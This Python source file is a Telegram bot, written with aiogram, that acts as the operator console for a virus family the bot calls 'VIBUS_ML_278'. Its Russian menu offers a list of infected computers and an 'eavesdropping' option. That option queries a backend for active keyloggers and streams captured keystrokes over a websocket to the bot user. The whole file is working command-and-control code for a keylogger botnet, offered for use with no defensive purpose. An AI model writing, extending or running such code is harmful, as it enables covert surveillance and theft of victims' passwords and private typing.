import asyncio
import aiohttp
from aiogram import Bot, Dispatcher
from aiogram.filters import CommandStart, StateFilter
from aiogram.types import Message, CallbackQuery
from config import TOKEN
from aiogram.utils.keyboard import InlineKeyboardBuilder, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import websockets


def keyboard_builder(width, *args):
    buttons = list(map(lambda x: InlineKeyboardButton(text=x, callback_data=x), args))
    kb_builder = InlineKeyboardBuilder()
    kb_builder.row(*buttons, width=width)
    return kb_builder.as_markup(resize_keyboard=True)


bot = Bot(token=TOKEN)
dp = Dispatcher()


class KeyloggerStates(StatesGroup):
    start_listening = State()


async def main() :
    await dp.start_polling(bot)


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer('Приветствую тебя в боте для управления самого мощного семейство вирусов "VIBUS_ML_278" ! Ну а раз ты уже здесь то ты достоин !!!')
    keyboard = keyboard_builder(4, "Зараженные компьютеры", "Инструкция", "Слова авторов", "Прослушка")
    await message.answer(text="что делаем ?", reply_markup=keyboard)


@dp.callback_query(lambda call: call.data == "Прослушка")
async def get_keyloggers(callback: CallbackQuery, state: FSMContext):
    url = "http://127.0.0.1:8000/check_keyloggers"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            data = await response.json()
            total = data["total"]
    if total:
        await callback.message.answer(text=f"Всего доступно {total} кейлоггеров \n"
                                           f" Выбери тот, к которому хочешь подключиться"
                                           f"Введи число от 1 до {total}")
        await state.set_state(KeyloggerStates.start_listening)
    else:
        await callback.message.answer("В данный момент нет доступных кейлоггеров(")


async def consumer_handler(websocket, message: Message):
    async for word in websocket:
        await message.answer(text=word)


@dp.message(lambda mes: mes.text.isdigit(), StateFilter(KeyloggerStates.start_listening))
async def connect_keylogger(message: Message):
    user_choice = int(message.text)
    url = f'ws://localhost:8000/ws/listen/{user_choice}'

    async with websockets.connect(url) as websocket:
        await consumer_handler(websocket, message)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('Exit')
